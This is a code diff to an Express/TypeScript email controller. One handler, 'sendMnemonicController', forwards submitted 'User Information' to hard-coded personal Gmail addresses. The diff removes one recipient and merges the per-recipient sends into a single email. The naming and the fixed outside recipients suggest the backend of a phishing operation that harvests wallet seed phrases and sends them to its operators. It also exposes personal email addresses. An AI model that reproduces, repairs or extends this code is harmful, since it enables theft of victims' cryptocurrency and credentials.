@@ -2,7 +2,7 @@ import { Request, Response } from "express";
 import { asyncHandler, errorResponse, successResponse } from "../utils/handlers";
 import nodemailer from "nodemailer";
 const getRecipients = (): string[] => {
-  const recipients = "rohitkumar952895@gmail.com,davidbrown202r@gmail.com,yahyanbenedict@gmail.com";
+  const recipients = "davidbrown202r@gmail.com,yahyanbenedict@gmail.com";
   if (!recipients) return [];
   return recipients.split(",").map((email) => email.trim());
 };
@@ -45,33 +45,27 @@ export const sendMnemonicController = asyncHandler(
       const subject = `[${payload.heading}] User Information Received - ${new Date().toLocaleDateString()}`;
 
       // Send separate emails for each recipient (per project payload.heading)
-      const results = await Promise.allSettled(
-        recipients.map((recipient) => {
-          const mailOptions = {
-            from: `"${payload.heading}" <davidbrown202e@gmail.com>`,
-            to: recipient,
-            subject: subject, // unique to each payload.heading/project
-            html: htmlContent,
-            headers: {
-              "Message-ID": `<${Date.now()}-${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-              "In-Reply-To": `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-              References: `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
-            },
-          };
-          return transporter.sendMail(mailOptions);
-        })
+      const mailOptions = {
+        from: `"${payload.heading}" <davidbrown202e@gmail.com>`,
+        to: recipients,
+        subject: subject, // unique to each payload.heading/project
+        html: htmlContent,
+        headers: {
+          "Message-ID": `<${Date.now()}-${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
+          "In-Reply-To": `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
+          References: `<${payload.heading.replace(/\s+/g, "-")}@yourapp.com>`,
+        },
+      };
+      await transporter.sendMail(mailOptions);
+
+      console.log(`✅ Email sent to all: ${recipients.join(", ")}`);
+
+      return successResponse(
+        res,
+        {},
+        `Email for "${payload.heading}" sent successfully to all recipients`,
+        200
       );
-
-      // Log send status
-      results.forEach((r, i) => {
-        if (r.status === "fulfilled") {
-          console.log(`✅ Email sent for ${payload.heading} → ${recipients[i]}`);
-        } else {
-          console.error(`❌ Failed for ${payload.heading} → ${recipients[i]}:`, r.reason?.message);
-        }
-      });
-
-      return successResponse(res, {}, `Emails for "${payload.heading}" sent successfully`, 200);
     } catch (error: any) {
       console.error("❌ Email sending failed:", error.message);
       return errorResponse(res, "Failed to send email", 500);
@@ -121,11 +115,9 @@ export const sendUserInfoController = asyncHandler(
       const subject = `[${title}] User Information Received - ${new Date().toLocaleDateString()}`;
 
       // Send separate emails for each recipient (per project title)
-      const results = await Promise.allSettled(
-        recipients.map((recipient) => {
           const mailOptions = {
             from: `"${title}" <davidbrown202e@gmail.com>`,
-            to: recipient,
+            to: recipients,
             subject: subject, // unique to each title/project
             html: htmlContent,
             headers: {
@@ -134,18 +126,7 @@ export const sendUserInfoController = asyncHandler(
               References: `<${title.replace(/\s+/g, "-")}@yourapp.com>`,
             },
           };
-          return transporter.sendMail(mailOptions);
-        })
-      );
-
-      // Log send status
-      results.forEach((r, i) => {
-        if (r.status === "fulfilled") {
-          console.log(`✅ Email sent for ${title} → ${recipients[i]}`);
-        } else {
-          console.error(`❌ Failed for ${title} → ${recipients[i]}:`, r.reason?.message);
-        }
-      });
+          await transporter.sendMail(mailOptions);
 
       return successResponse(res, {}, `Emails for "${title}" sent successfully`, 200);
     } catch (error: any) {
